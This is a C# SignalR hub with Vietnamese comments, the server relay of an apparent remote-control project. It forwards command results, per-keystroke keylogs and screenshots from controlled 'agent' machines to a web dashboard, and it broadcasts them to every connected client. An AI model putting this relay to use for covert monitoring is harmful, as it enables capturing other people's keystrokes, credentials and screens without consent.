using Microsoft.AspNetCore.SignalR;
using RCS.Common.Models;
using RCS.Common.Protocols;
using RCS.Server.Services;
using System;
using System.Threading.Tasks;

namespace RCS.Server.Hubs
{
    /// <summary>
    /// Hub dành riêng cho Agent (Máy bị điều khiển) kết nối vào.
    /// Nhiệm vụ: Nhận dữ liệu từ Agent và chuyển tiếp (Forward) sang cho Client (Người điều khiển).
    /// </summary>
    public class AgentHub : Hub
    {
        // Inject HubContext của ClientHub để có thể gửi tin nhắn sang cho phía Web Dashboard
        private readonly IHubContext<ClientHub> _clientHubContext;
        
        // Service quản lý danh sách kết nối (Mapping giữa AgentID và ConnectionID)
        private readonly IConnectionManager _connectionManager;

        public AgentHub(IHubContext<ClientHub> clientHubContext, IConnectionManager connectionManager)
        {
            _clientHubContext = clientHubContext;
            _connectionManager = connectionManager;
        }

        #region --- CONNECTION LIFECYCLE (QUẢN LÝ KẾT NỐI) ---

        /// <summary>
        /// Hàm này được Agent gọi ngay sau khi connect thành công để định danh.
        /// </summary>
        /// <param name="agentId">Mã định danh của máy Agent (VD: Agent_12345)</param>
        public void RegisterAgent(string agentId)
        {
            // Lưu mapping: AgentId <-> ConnectionId hiện tại
            _connectionManager.AddAgent(agentId, Context.ConnectionId);
            
            Console.WriteLine($"[AgentHub] Agent Registered: {agentId} (ConnId: {Context.ConnectionId})");
        }

        /// <summary>
        /// Tự động kích hoạt khi Agent bị mất kết nối (tắt máy, rớt mạng).
        /// </summary>
        public override Task OnDisconnectedAsync(Exception exception)
        {
            // Xóa Agent khỏi danh sách quản lý để tránh gửi lệnh vào hư vô
            _connectionManager.RemoveAgent(Context.ConnectionId);
            
            Console.WriteLine($"[AgentHub] Agent Disconnected: {Context.ConnectionId}");
            return base.OnDisconnectedAsync(exception);
        }

        #endregion

        #region --- DATA FORWARDING (CHUYỂN TIẾP DỮ LIỆU SANG CLIENT) ---

        // Lưu ý: Trong các hàm dưới đây, chúng ta dùng _clientHubContext để gửi sang "ClientHub"
        // chứ không gửi lại cho chính Agent (Clients.Caller).

        /// <summary>
        /// Agent gửi kết quả thực thi lệnh (VD: Danh sách App, Process, thông báo đã tắt máy...).
        /// </summary>
        public async Task SendResponse(ResponseMessage response)
        {
            // Forward gói tin này về cho Web Dashboard.
            // "ReceiveResponse" là tên hàm JS bên phía Client (Web).
            // Hiện tại đang gửi Broadcast (All), thực tế nên gửi cho User cụ thể đang điều khiển Agent này.
            await _clientHubContext.Clients.All.SendAsync("ReceiveResponse", response);
        }

        /// <summary>
        /// Agent gửi dữ liệu thời gian thực (VD: Keylog từng phím bấm).
        /// </summary>
        public async Task SendUpdate(RealtimeUpdate update)
        {
            // Chuyển tiếp ngay lập tức sang Client để hiển thị log
            await _clientHubContext.Clients.All.SendAsync("ReceiveUpdate", update);
        }

        /// <summary>
        /// Agent gửi dữ liệu nhị phân nặng (VD: Ảnh chụp màn hình - Screenshot).
        /// </summary>
        public async Task SendBinaryStream(string base64Data)
        {
            // Chuyển tiếp chuỗi Base64 hình ảnh sang Client để hiển thị lên thẻ <img>
            await _clientHubContext.Clients.All.SendAsync("ReceiveBinaryChunk", base64Data);
        }

        #endregion
    }
}